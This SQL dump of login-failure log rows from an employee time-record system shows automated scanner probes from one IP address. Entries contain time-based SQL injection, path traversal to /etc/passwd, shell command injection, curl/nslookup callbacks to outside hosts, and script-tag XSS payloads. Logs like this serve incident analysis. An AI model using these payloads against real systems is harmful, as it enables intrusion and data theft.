INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('818', '', '2023-05-08 03:42:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('819', '', '2023-05-08 03:42:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('820', '', '2023-05-08 03:42:30', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('821', '', '2023-05-08 03:42:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('822', '', '2023-05-08 03:42:30', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('823', '', '2023-05-08 03:42:31', '', 'Invalid username/password. Tried with: check_dtr', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('824', '', '2023-05-08 03:42:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('825', '', '2023-05-08 03:42:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('826', '', '2023-05-08 03:42:31', '', 'Invalid username/password. Tried with: check_dtr/.', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('827', '', '2023-05-08 03:42:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('828', '', '2023-05-08 03:42:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('829', '', '2023-05-08 03:42:31', '', 'Invalid username/password. Tried with: VFXEcCXC\') OR 270=(SELECT 270 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('830', '', '2023-05-08 03:42:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('831', '', '2023-05-08 03:42:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('832', '', '2023-05-08 03:42:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('833', '', '2023-05-08 03:42:31', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('834', '', '2023-05-08 03:42:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('835', '', '2023-05-08 03:42:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('836', '', '2023-05-08 03:42:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('837', '', '2023-05-08 03:42:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('838', '', '2023-05-08 03:42:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('839', '', '2023-05-08 03:42:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('840', '', '2023-05-08 03:42:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('841', '', '2023-05-08 03:42:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('842', '', '2023-05-08 03:42:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('843', '', '2023-05-08 03:42:32', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('844', '', '2023-05-08 03:42:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('845', '', '2023-05-08 03:42:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('846', '', '2023-05-08 03:42:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('847', '', '2023-05-08 03:42:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('848', '', '2023-05-08 03:42:33', '', 'Invalid username/password. Tried with: wFlShAIb\')) OR 311=(SELECT 311 FROM PG_SLEEP(15))--', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('849', '', '2023-05-08 03:42:33', '', 'Invalid username/password. Tried with: \'\"()', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('850', '', '2023-05-08 03:42:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('851', '', '2023-05-08 03:42:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('852', '', '2023-05-08 03:42:33', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('853', '', '2023-05-08 03:42:33', '', 'Invalid username/password. Tried with: RDFYjolf\'&&sleep(27*1000)*qqnoko&&\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('854', '', '2023-05-08 03:42:34', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('855', '', '2023-05-08 03:42:34', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('856', '', '2023-05-08 03:42:34', '', 'Invalid username/password. Tried with: RDFYjolf\"&&sleep(27*1000)*vsnuii&&\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('857', '', '2023-05-08 03:42:34', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('858', '', '2023-05-08 03:42:34', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('859', '', '2023-05-08 03:42:34', '', 'Invalid username/password. Tried with: RDFYjolf\'||sleep(27*1000)*bpogpr||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('860', '', '2023-05-08 03:42:34', '', 'Invalid username/password. Tried with: ../../../../../../../../../../../../../../windows/win.ini', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('861', '', '2023-05-08 03:42:34', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('862', '', '2023-05-08 03:42:34', '', 'Invalid username/password. Tried with: RDFYjolf\"||sleep(27*1000)*gndvyw||\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('863', '', '2023-05-08 03:42:34', '', 'Invalid username/password. Tried with: file:///etc/passwd', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('864', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('865', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('866', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('867', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('868', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: RDFYjolf\'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('869', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('870', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: ../RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('871', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: echo bptcjy$()\\ dzjcdp\\nz^xyu||a #\' &echo bptcjy$()\\ dzjcdp\\nz^xyu||a #|\" &echo bptcjy$()\\ dzjcdp\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('872', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('873', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: 1\'\"', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('874', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('875', '', '2023-05-08 03:42:35', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('876', '', '2023-05-08 03:42:36', '', 'Invalid username/password. Tried with: 1%2527%2522', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('877', '', '2023-05-08 03:42:36', '', 'Invalid username/password. Tried with: &echo iuralc$()\\ phlxtg\\nz^xyu||a #\' &echo iuralc$()\\ phlxtg\\nz^xyu||a #|\" &echo iuralc$()\\ phlxtg\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('878', '', '2023-05-08 03:42:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('879', '', '2023-05-08 03:42:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('880', '', '2023-05-08 03:42:36', '', 'Invalid username/password. Tried with: @@m2NGZ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('881', '', '2023-05-08 03:42:36', '', 'Invalid username/password. Tried with: |echo tuwanl$()\\ qcocrr\\nz^xyu||a #\' |echo tuwanl$()\\ qcocrr\\nz^xyu||a #|\" |echo tuwanl$()\\ qcocrr\\nz^xyu||a #', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('882', '', '2023-05-08 03:42:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('883', '', '2023-05-08 03:42:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('884', '', '2023-05-08 03:42:36', '', 'Invalid username/password. Tried with: (nslookup -q=cname hitxtnocqkezq9f29f.bxss.me||curl hitxtnocqkezq9f29f.bxss.me))', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('885', '', '2023-05-08 03:42:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('886', '', '2023-05-08 03:42:36', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('887', '', '2023-05-08 03:42:37', '', 'Invalid username/password. Tried with: $(nslookup -q=cname hitkomqbbstyuc126d.bxss.me||curl hitkomqbbstyuc126d.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('888', '', '2023-05-08 03:42:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('889', '', '2023-05-08 03:42:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('890', '', '2023-05-08 03:42:37', '', 'Invalid username/password. Tried with: &nslookup -q=cname hitcgzbsdodef84c05.bxss.me&\'\\\"`0&nslookup -q=cname hitcgzbsdodef84c05.bxss.me&`\'', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('891', '', '2023-05-08 03:42:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('892', '', '2023-05-08 03:42:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('893', '', '2023-05-08 03:42:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('894', '', '2023-05-08 03:42:37', '', 'Invalid username/password. Tried with: &(nslookup -q=cname hitntcgihnryo715c7.bxss.me||curl hitntcgihnryo715c7.bxss.me)&\'\\\"`0&(nslookup -q=cname hitnt', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('895', '', '2023-05-08 03:42:37', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('896', '', '2023-05-08 03:42:38', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('897', '', '2023-05-08 03:42:38', '', 'Invalid username/password. Tried with: |(nslookup -q=cname hituvizdemcsj8957b.bxss.me||curl hituvizdemcsj8957b.bxss.me)', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('898', '', '2023-05-08 03:42:38', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('899', '', '2023-05-08 03:42:38', '', 'Invalid username/password. Tried with: `(nslookup -q=cname hitttdyxdmssl3c7fa.bxss.me||curl hitttdyxdmssl3c7fa.bxss.me)`', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('900', '', '2023-05-08 03:42:38', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('901', '', '2023-05-08 03:42:38', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('902', '', '2023-05-08 03:42:38', '', 'Invalid username/password. Tried with: ', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('903', '', '2023-05-08 03:42:38', '', 'Invalid username/password. Tried with: ;(nslookup -q=cname hitrsurzlhuio5dcc8.bxss.me||curl hitrsurzlhuio5dcc8.bxss.me)|(nslookup -q=cname hitrsurzlhu', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('904', '', '2023-05-08 03:42:38', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('905', '', '2023-05-08 03:42:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('906', '', '2023-05-08 03:42:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('907', '', '2023-05-08 03:42:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('908', '', '2023-05-08 03:42:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('909', '', '2023-05-08 03:42:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('910', '', '2023-05-08 03:42:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('911', '', '2023-05-08 03:42:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('912', '', '2023-05-08 03:42:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('913', '', '2023-05-08 03:42:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('914', '', '2023-05-08 03:42:39', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('915', '', '2023-05-08 03:42:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('916', '', '2023-05-08 03:42:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('917', '', '2023-05-08 03:42:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('918', '', '2023-05-08 03:42:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('919', '', '2023-05-08 03:42:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('920', '', '2023-05-08 03:42:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('921', '', '2023-05-08 03:42:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('922', '', '2023-05-08 03:42:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('923', '', '2023-05-08 03:42:40', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('924', '', '2023-05-08 03:42:40', '', 'Invalid username/password. Tried with: 1IMokI6ltO', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('925', '', '2023-05-08 03:42:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('926', '', '2023-05-08 03:42:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('927', '', '2023-05-08 03:42:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('928', '', '2023-05-08 03:42:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('929', '', '2023-05-08 03:42:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('930', '', '2023-05-08 03:42:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('931', '', '2023-05-08 03:42:41', '', 'Invalid username/password. Tried with: xfs.bxss.me', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('932', '', '2023-05-08 03:42:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('933', '', '2023-05-08 03:42:41', '', 'Invalid username/password. Tried with: RDFYjolf\'\"()&%<zzz><ScRiPt >2p4I(9459)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('934', '', '2023-05-08 03:42:41', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('935', '', '2023-05-08 03:42:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('936', '', '2023-05-08 03:42:42', '', 'Invalid username/password. Tried with: \'\"()&%<zzz><ScRiPt >2p4I(9986)</ScRiPt>', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('937', '', '2023-05-08 03:42:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('938', '', '2023-05-08 03:42:42', '', 'Invalid username/password. Tried with: RDFYjolf', '107.178.112.106');
INSERT INTO `tblempdtr_log` (`id`, `empNumber`, `log_date`, `log_sql`, `log_notify`, `log_ip`) VALUES ('939', '', '2023-05-08 03:42:42', '', 'Invalid username/password. Tried with: RDFYjolf9922600', '107.178.112.106');
